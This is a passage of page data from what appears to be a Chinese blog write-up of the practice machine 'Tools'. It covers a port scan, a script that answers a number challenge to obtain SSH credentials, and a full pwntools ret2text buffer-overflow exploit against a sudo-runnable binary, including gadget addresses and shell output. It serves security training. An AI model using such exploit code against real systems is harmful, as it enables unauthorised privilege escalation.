{"pageProps":{"postData":{"id":"群U靶机Tools","contentHtml":"<h1>Tools</h1>\n<h2>Recon</h2>\n<p>端口扫描</p>\n<pre><code class=\"hljs language-bash\">➜  ~ nmap -sT -min-rate 5000 192.168.56.82\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 15:51 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.82\nHost is up (0.00058s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:43:CC:F4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 13.24 seconds\n</code></pre>\n<h2>爆破 1337</h2>\n<p>访问<code>80</code>端口提示</p>\n<p><img src=\"/post-images/%E7%BE%A4U%E9%9D%B6%E6%9C%BATools/image.png\" alt=\"image.png\"></p>\n<p><code>1337</code> 端口是要我们输入什么</p>\n<pre><code class=\"hljs language-bash\">➜  ~ nc 192.168.56.82 1337\nPlease input [152]: 152\nPlease input [921]: 921\nPlease input [441]: 441\nPlease input [105]: 105\nPlease input [534]: 534\nPlease input [192]: 192\nPlease input [626]: 626\nPlease input [968]: 968\nPlease input [674]: 674\nPlease input [494]: 494\nPlease input [768]: 768\nPlease input [808]: 808\nPlease input [365]: 365\nPlease input [438]: 438\nPlease input [975]: 975\nPlease input [165]: 165\nPlease input [796]: 796\nPlease input [892]:\n</code></pre>\n<p><code>AI</code> 脚本直接爆破</p>\n<pre><code class=\"hljs language-bash\">import socket\nimport re\nimport <span class=\"hljs-keyword\">time</span>\n\n<span class=\"hljs-comment\"># --- 配置 ---</span>\nHOST = <span class=\"hljs-string\">'192.168.56.82'</span>  <span class=\"hljs-comment\"># 目标服务器 IP 地址</span>\nPORT = 1337  <span class=\"hljs-comment\"># 目标服务器端口</span>\n<span class=\"hljs-comment\"># ------------</span>\n\n<span class=\"hljs-comment\"># 正则表达式，用于从文本中提取方括号内的数字</span>\npattern = re.compile(r<span class=\"hljs-string\">\"\\[(\\d+)\\]\"</span>)\n\n<span class=\"hljs-comment\"># 定义一个函数，从socket中读取数据，直到遇到特定的分隔符</span>\ndef read_until(sock, delimiter):\n    <span class=\"hljs-string\">\"\"</span><span class=\"hljs-string\">\"从 sock 中读取数据，直到接收到 delimiter 为止\"</span><span class=\"hljs-string\">\"\"</span>\n    data = b<span class=\"hljs-string\">\"\"</span>\n    <span class=\"hljs-keyword\">while</span> not data.endswith(delimiter):\n        try:\n            <span class=\"hljs-comment\"># 一次只读取一个字节，避免读取过多内容</span>\n            chunk = sock.recv(1)\n            <span class=\"hljs-keyword\">if</span> not chunk:  <span class=\"hljs-comment\"># 如果连接关闭，recv会返回空字节串</span>\n                <span class=\"hljs-built_in\">return</span> data  <span class=\"hljs-comment\"># 返回已接收的数据</span>\n            data += chunk\n        except socket.timeout:\n            <span class=\"hljs-comment\"># 如果发生超时，也返回已接收的数据</span>\n            <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"\\n[!] 读取超时\"</span>)\n            <span class=\"hljs-built_in\">return</span> data\n    <span class=\"hljs-built_in\">return</span> data\n\ntry:\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        <span class=\"hljs-comment\"># 设置一个超时，防止脚本在任何recv操作上永久卡住</span>\n        s.settimeout(3)\n        <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"[*] 连接到 {HOST}:{PORT}...\"</span>)\n        s.connect((HOST, PORT))\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[+] 连接成功！\"</span>)\n\n        <span class=\"hljs-keyword\">while</span> True:\n            <span class=\"hljs-comment\"># 读取服务器的提示，直到 \": \" 出现</span>\n            <span class=\"hljs-comment\"># 我们用 b': ' 是因为它是一个字节字符串</span>\n            prompt_bytes = read_until(s, b<span class=\"hljs-string\">': '</span>)\n\n            <span class=\"hljs-comment\"># 如果读取到的数据为空，说明连接可能已断开</span>\n            <span class=\"hljs-keyword\">if</span> not prompt_bytes:\n                <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"\\n[*] 连接已关闭。\"</span>)\n                <span class=\"hljs-built_in\">break</span>\n\n            <span class=\"hljs-comment\"># 将字节解码为字符串以便处理</span>\n            prompt_str = prompt_bytes.decode(<span class=\"hljs-string\">'utf-8'</span>)\n            <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"[&#x3C;] 收到: {prompt_str}\"</span>, end=<span class=\"hljs-string\">''</span>)  <span class=\"hljs-comment\"># 用 end='' 避免打印多余的换行</span>\n\n            <span class=\"hljs-comment\"># 在收到的提示中查找数字</span>\n            match = pattern.search(prompt_str)\n\n            <span class=\"hljs-keyword\">if</span> match:\n                <span class=\"hljs-comment\"># 提取数字</span>\n                number_to_send = match.group(1)\n\n                <span class=\"hljs-comment\"># 准备要发送的数据（数字 + 换行符）</span>\n                response = (number_to_send + <span class=\"hljs-string\">'\\n'</span>).encode(<span class=\"hljs-string\">'utf-8'</span>)\n\n                <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\" [>] 发送: {number_to_send}\"</span>)  <span class=\"hljs-comment\"># 在同一行打印发送内容</span>\n\n                <span class=\"hljs-comment\"># 发送响应</span>\n                s.sendall(response)\n\n                <span class=\"hljs-comment\"># 短暂延迟，有时可以避免竞态条件</span>\n                time.sleep(0.1)\n            <span class=\"hljs-keyword\">else</span>:\n                <span class=\"hljs-comment\"># 如果在提示中没有找到数字，说明挑战结束了</span>\n                <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"\\n\\n[*] 未找到挑战数字，假定挑战已完成。\"</span>)\n                <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[*] 服务器最终响应：\"</span>)\n                <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"====================================\"</span>)\n                <span class=\"hljs-built_in\">print</span>(prompt_str.strip())  <span class=\"hljs-comment\"># 打印我们已收到的部分</span>\n\n                <span class=\"hljs-comment\"># 尝试再多接收一些数据，因为flag可能跟在后面</span>\n                try:\n                    final_data = s.recv(4096).decode(<span class=\"hljs-string\">'utf-8'</span>).strip()\n                    <span class=\"hljs-keyword\">if</span> final_data:\n                        <span class=\"hljs-built_in\">print</span>(final_data)\n                except socket.timeout:\n                    pass  <span class=\"hljs-comment\"># 没有更多数据是正常的</span>\n\n                <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"====================================\"</span>)\n                <span class=\"hljs-built_in\">break</span>\n\nexcept ConnectionRefusedError:\n    <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"[!] 连接被拒绝。请检查 IP ({HOST}) 和端口 ({PORT})。\"</span>)\nexcept socket.timeout:\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[!] 连接超时。服务器没有在规定时间内响应。\"</span>)\nexcept Exception as e:\n    <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"[!] 发生未知错误: {e}\"</span>)\n\n<span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[*] 脚本执行完毕。\"</span>)\n\n</code></pre>\n<p>得到凭据 <code>welcome</code>:<code>learnpwntools</code></p>\n<pre><code class=\"hljs language-bash\">[&#x3C;] 收到: Please input [407]:  [>] 发送: 407\n[&#x3C;] 收到: Please input [510]:  [>] 发送: 510\n[&#x3C;] 收到: user/pass:welcome/learnpwntools\n</code></pre>\n<h2>缓冲区溢出</h2>\n<p>查看 <code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-bash\">welcome@Tools:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> welcome on Tools:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser welcome may run the following commands on Tools:\n    (ALL) NOPASSWD: /opt/find_backdoor\n</code></pre>\n<p>运行，发现会有 <code>Segmentation fault</code></p>\n<pre><code class=\"hljs language-bash\">welcome@Tools:~$ /opt/find_backdoor       \nplease input                                      \n111111111111111111111111111                                                                                       \nok,<span class=\"hljs-built_in\">bye</span>!!!111111111111111111111111111                                                                              \nok,<span class=\"hljs-built_in\">bye</span>!!!                                                                                                         \nSegmentation fault \n</code></pre>\n<p>拉出来反编译一看存在缓存区溢出漏洞</p>\n<p><img src=\"/post-images/%E7%BE%A4U%E9%9D%B6%E6%9C%BATools/image1.png\" alt=\"image.png\"></p>\n<p>查看安全机制，裸奔</p>\n<pre><code class=\"hljs language-bash\">welcome@Tools:~$ file /opt/find_backdoor \n/opt/find_backdoor: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class=\"hljs-keyword\">for</span> GNU/Linux 3.2.0, BuildID[sha1]=1c72ddcad651c7f35bb655e0ddda5ecbf8d31999, not stripped\nwelcome@Tools:~$ checksec /opt/find_backdoor \n[*] <span class=\"hljs-string\">'/opt/find_backdoor'</span>\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX unknown - GNU_STACK missing\n    PIE:        No PIE (0x400000)\n    Stack:      Executable\n    RWX:        Has RWX segments\n    Stripped:   No\n</code></pre>\n<p><code>shift+F12</code>查看字符串，存在 <code>/bin/sh</code></p>\n<p><img src=\"/post-images/%E7%BE%A4U%E9%9D%B6%E6%9C%BATools/image2.png\" alt=\"image.png\"></p>\n<p>查看 <code>plt</code> ，有<code>system</code>函数，可以直接用</p>\n<pre><code class=\"hljs language-bash\">pwndbg> plt\nSection .plt 0x401020 - 0x401060:\n0x401030: puts@plt\n0x401040: system@plt\n0x401050: gets@plt\n</code></pre>\n<p>有 <code>system</code> 和 <code>/bin/sh</code> ，直接梭哈</p>\n<p>计算偏移值，得到<code>23</code></p>\n<pre><code class=\"hljs language-bash\">➜  ttt /usr/bin/msf-pattern_create -l 200\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab...Ag0Ag1Ag2Ag3Ag4Ag5Ag\n</code></pre>\n<pre><code class=\"hljs language-bash\">pwndbg> x/xg 0x7fffffffdf58\n0x7fffffffdf58: 0x3765413665413565\n</code></pre>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  ttt /usr/bin/msf-pattern_offset -l 200 -q 0x3765413665413565        \n[*] Exact match at offset 23\n</code></pre>\n<p>拿一下需要用到的地址</p>\n<pre><code class=\"hljs language-bash\">welcome@Tools:~$ ROPgadget --binary /opt/find_backdoor --string <span class=\"hljs-string\">\"/bin/sh\"</span>\nStrings information\n============================================================\n0x000000000040201b : /bin/sh\n</code></pre>\n<pre><code class=\"hljs language-ruby\">welcome<span class=\"hljs-variable\">@Tools</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span><span class=\"hljs-title class_\">ROPgadget</span> --binary /opt/find_backdoor --only <span class=\"hljs-string\">\"pop|ret\"</span>\n<span class=\"hljs-title class_\">Gadgets</span> information\n============================================================\n<span class=\"hljs-number\">0x00000000004011fb</span> : pop rdi ; ret\n</code></pre>\n<pre><code class=\"hljs language-bash\">welcome@Tools:~$ ROPgadget --binary /opt/find_backdoor --only <span class=\"hljs-string\">\"pop|ret\"</span>\nGadgets information\n============================================================\n0x0000000000401016 : ret\n</code></pre>\n<p>编写利用脚本</p>\n<pre><code class=\"hljs language-bash\">from pwn import *\nr = ssh(host=<span class=\"hljs-string\">'192.168.56.82'</span>, user=<span class=\"hljs-string\">'welcome'</span>, password=<span class=\"hljs-string\">'learnpwntools'</span>)\np = r.process([<span class=\"hljs-string\">'sudo'</span>, <span class=\"hljs-string\">'/opt/find_backdoor'</span>]) \nsystem_addr = 0x401040\nbin_sh_addr = 0x000000000040201b\npop_rdi_addr = 0x00000000004011fb\nret = 0x0000000000401016\n\npayload = b<span class=\"hljs-string\">'A'</span> * 23 + p64(ret) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)\np.sendlineafter(b<span class=\"hljs-string\">'please input'</span>,payload)\np.interactive()\n</code></pre>\n<pre><code class=\"hljs language-bash\">    IBT:      Disabled\n[+] Starting remote process None on 192.168.56.82: pid 1105\n[!] ASLR is disabled <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'/opt/find_backdoor'</span>!\n[*] Switching to interactive mode\n\nAAAAAAAAAAAAAAAAAAAAAAA\\x16\\x10@\nok,<span class=\"hljs-built_in\">bye</span>!!!\n$ $ <span class=\"hljs-built_in\">whoami</span>\nwelcome\n</code></pre>\n<p><img src=\"/post-images/%E7%BE%A4U%E9%9D%B6%E6%9C%BATools/image3.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/%E7%BE%A4U%E9%9D%B6%E6%9C%BATools/image4.png\" alt=\"image.png\"></p>","title":"群U靶机 - Tools","date":"2025-06-16","updated":"2025-06-16","tags":["PWN","ROP","ret2text","crack"],"categories":"靶机","comments":true,"description":"Tools\n\nRecon\n\n端口扫描\n\n\n\n爆破 1337\n\n访问`80`端口提示\n\n\n\n`1337` 端口是要我们输入什么\n\n\n\n`AI` 脚本直接爆破\n\n\n\n得到凭据 `welcome`:`learnpwntools`\n\n\n\n缓冲区溢出\n\n查看 `sudo` 权限\n\n\n\n运行，发现会有 `Segmentation fault`\n\n\n\n拉出来反编译一看存在缓存区溢出漏洞\n\n\n\n查看安全机制，裸奔..."},"recentPosts":[{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"},{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":"09","day":"29"},{"id":"TheHackersLabsPa Que Aiga Lujo","title":"TheHackersLabs - Pa Que Aiga Lujo","date":"2025-09-28","isEncrypted":false,"year":"2025","month":"09","day":"28"}]},"__N_SSG":true}